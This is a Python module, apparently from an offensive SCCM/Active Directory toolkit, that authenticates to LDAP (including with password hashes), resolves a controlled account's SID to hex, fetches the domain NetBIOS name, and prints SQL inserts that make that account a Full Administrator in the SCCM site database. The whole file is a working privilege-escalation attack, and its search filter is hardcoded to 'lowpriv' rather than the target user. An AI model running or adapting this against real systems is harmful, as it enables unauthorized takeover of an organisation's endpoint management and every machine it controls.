from lib.ldap import init_ldap_session
from lib.logger import logger 
from impacket.ldap import ldaptypes
import ldap3
from getpass import getpass


class MSSQL:

    def __init__(self, username=None, password=None, domain=None, target_dom=None, 
                        dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None, 
                        aes=None, debug=False, target_user=None, site_code=None):
            self.username = username
            self.password = password
            self.domain = domain
            self.target_dom = target_dom
            self.dc_ip = dc_ip
            self.ldaps = ldaps
            self.kerberos = kerberos
            self.no_pass = no_pass
            self.hashes=hashes
            self.aes = aes
            self.debug = debug
            self.target_user = target_user
            self.site_code = site_code
            self.netbiosname = ""
            self.query_sid = ""
    
    def run(self):
           
        lmhash = ""
        nthash = ""
        
        if self.hashes:
            lmhash, nthash = self.hashes.split(':')
        if not (self.password or self.hashes or self.aes or self.no_pass):
                self.password = getpass("Password:")

        # set search base to query
        if self.target_dom:
            self.search_base = self.get_dn(self.target_dom)
        else:
            self.search_base = self.get_dn(self.domain)

        try:
            ldap_server, self.ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password,
                                                           lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, 
                                                           aesKey=self.aes, hashes=self.hashes, ldaps=self.ldaps)
            logger.debug(f'[+] Bind successful {ldap_server}')

        except ldap3.core.exceptions.LDAPSocketOpenError as e: 
            if 'invalid server address' in str(e):
                logger.info(f'[-] Invalid server address - {self.domain}')
            else:
                logger.info('[-] Error connecting to LDAP server')
                print()
                logger.info(e)
            return False
        except ldap3.core.exceptions.LDAPBindError as e:
            logger.info(f'[-] Error: {str(e)}')
            return False
        
        logger.info(f'[*] Resolving {self.target_user} SID...')
        

        try:
            self.ldap_session.extend.standard.paged_search(self.search_base, 
                                                           search_filter="(samaccountname=lowpriv)", 
                                                           attributes="objectsid",
                                                           paged_size=1, 
                                                           generator=False)  
        except ldap3.core.exceptions.LDAPAttributeError as e:
            print()
            logger.info(f'[-] Error: {str(e)}')
            exit()
        if self.ldap_session.entries:
            for entry in self.ldap_session.entries:
                sid = str(entry['objectsid'])
                logger.debug(f"[+] Found {self.target_user} SID: {sid}")
                #abusing MSSQL requires the hex SID of the owned account
                #REF: https://thehacker.recipes/ad/movement/sccm-mecm#1.-retreive-the-controlled-user-sid
                hexsid = ldaptypes.LDAP_SID()
                hexsid.fromCanonical(sid)
                self.querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
                logger.info(f'[*] Converted {self.target_user} SID to {self.querysid}')

        else:
            print("[-] Failed to resolve target SID.")
            return False
        
        try:
            search_base = f"CN=Configuration,{self.search_base}"
            search_filter = f"(&(objectclass=crossRef)(ncname={self.search_base}))"
            self.ldap_session.extend.standard.paged_search(search_base=search_base, 
                                                           search_filter=search_filter, 
                                                           attributes="nETBIOSName",
                                                           paged_size=1, 
                                                           generator=False)  
        except ldap3.core.exceptions.LDAPAttributeError as e:
            print()
            logger.info(f'[-] Error: {str(e)}')
            exit()
        if self.ldap_session.entries:
            for entry in self.ldap_session.entries:
                self.netbiosname = str(entry['nETBIOSName'])
                logger.debug(f"[+] Found domain netbiosname: {self.netbiosname}")
        else:
            print("[-] Failed to resolve netbiosname.")
            return False
        
        self.mssql_abuse(self.querysid)
        '''
        need to get the netbios name of the domain
        ldapsearch -LLL -x -H ldap://10.10.100.76 -D 'bullshit\\administrator' -w 'P@ssw0rd' -b 'CN=Configuration,DC=blah,DC=blah' "(&(objectclass=crossRef)(ncname=DC=blah,DC=blah))" nETBIOSName
        '''
        
    def mssql_abuse(self,hex_sid):
        hex_sid = hex_sid
        logger.info(f"[*] Use the following to add {self.target_user} as a Site Server Admin.")
        #need to fix this to get the flatname of the domain. from testing the domain doesn't really matter and
        #is used just for display
        first_queries = f'''
        use CM_{self.site_code}
        INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'{self.netbiosname}\\{self.target_user}',0,0,'','','','','{self.site_code}');
        SELECT AdminID,LogonName FROM RBAC_Admins;
        '''
        logger.info(first_queries)
        admin_id = input("[*] Enter AdminID:")
        while not admin_id:
            admin_id = input("[*] Enter AdminID:")
        second_queries = f'''
        INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00ALL','29');
        INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00001','1');
        INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ({admin_id},'SMS0001R','SMS00004','1');
        '''
        logger.info(second_queries)


    def get_dn(self, domain):
        components = domain.split('.')
        base = ''
        for comp in components:
            base += f',DC={comp}'
        
        return base[1:]




        